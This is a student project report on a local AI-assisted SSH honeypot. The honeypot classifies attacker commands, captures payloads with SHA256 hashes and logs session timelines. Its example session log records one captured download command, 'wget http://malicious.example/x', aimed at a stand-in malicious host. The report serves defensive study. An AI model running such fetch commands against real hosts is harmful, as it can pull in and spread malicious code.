# AI-Driven Smart Honeypot — Project Report (Short)

**Project title:** AI-Driven Smart Network Honeypot with Automated Intrusion Classification and Engagement

**Author:** <Ravikiran.U>  
**Project type:** Final Year Project — Computer Science (Network Security / AI)

## Abstract (1 paragraph)
This project implements a local honeypot that simulates an SSH service, classifies incoming attacker activity using a lightweight AI rule-based classifier, and dynamically escalates engagement. The system detects download attempts (e.g., `wget`/`curl`), captures payloads in a quarantined evidence store (with SHA256 and size), and records a timestamped event timeline (`meta.json`) per session. A high-engagement module provides a fake interactive shell to keep attackers engaged for further observation.

## Key contributions (what's new)
- **Real-time attack classification** (recon / bruteforce / exploit) based on extracted features.
- **Adaptive engagement policy** that escalates to a fake shell for high-confidence exploits.
- **Automated payload capture & evidence chain** — saved with SHA256, size and timestamp, verified by a verification script.
- **Forensics-ready session output** (`meta.json`) that correlates raw commands, AI labels, actions, and captured artifacts.

## Architecture (short)
- `src/orchestrator.py` — core server (listens on 127.0.0.1:2222), session orchestration.
- `src/interaction_engine.py` — fake banners and command responses.
- `src/feature_extractor.py` & `src/classifier.py` — feature extraction and lightweight AI classifier.
- `src/policy_engine.py` — decides engagement level (LOW/MEDIUM/HIGH).
- `src/evidence_store.py` — quarantined payload saving with SHA256.
- `data/sessions/S-*` — per-session folder with `meta.json` and payload files.

## How to demo (script)
1. Start honeypot:

```bash
python run_honeypot.py
```

2. In a second terminal run test client:

```bash
python test_client_interactive.py
```

3. Show session evidence:

```bash
python show_latest_session.py
python verify_meta_integrity.py
```

4. Export evidence:

```powershell
(PowerShell) Compress-Archive -Path ".\data\sessions<SESSION>*" -DestinationPath ".<SESSION>_evidence.zip"
```

## Safety
- All payloads are quarantined and **not executed**.
- System runs on `127.0.0.1` only by default — do not expose to the internet.

## Files to include in submission
- `src/` (core), `run_honeypot.py`, `test_client_interactive.py`, `data/sessions/<sample>`, `REPORT.md`, `verify_meta_integrity.py`, unit tests.

## Addendum: example session metadata excerpt
Below is a short excerpt from a captured `meta.json` (redacted for brevity) to show the recorded structure and timestamps:

```json
{
	"session_id": "S-1762597591",
	"src_ip": "127.0.0.1",
	"src_port": 60336,
	"events": [
		{"ts": 1762597591.1097333, "text": "wget http://malicious.example/x"},
		{"ts": 1762597591.1497934, "text": "[CLASS]=exploit|0.9|ENG=HIGH"},
		{"ts": 1762597591.1534998, "text": "[PAYLOAD_SAVED]={'file':'payload_handoff_1762597591.bin','path':'C:\\project\\data\\sessions\\S-1762597591\\payload_handoff_1762597591.bin','sha256':'ed0d...0516','size':26}",
		{"ts": 1762597591.2417018, "text": "[HIGH_ENGAGEMENT]=START"}
	]
}
```

## Timestamps and reproducibility
- All recorded timestamps are Unix epoch floats in `meta.json` (see `ts` fields above). Use `time.localtime()` or the included `generate_report.py` to render human-friendly times.

## Files added/changed for submission
- `REPORT.md` (this file) — updated with example metadata excerpt.
- `OUTPUT.md` / `OUTPUT.pdf` — generated session summaries.
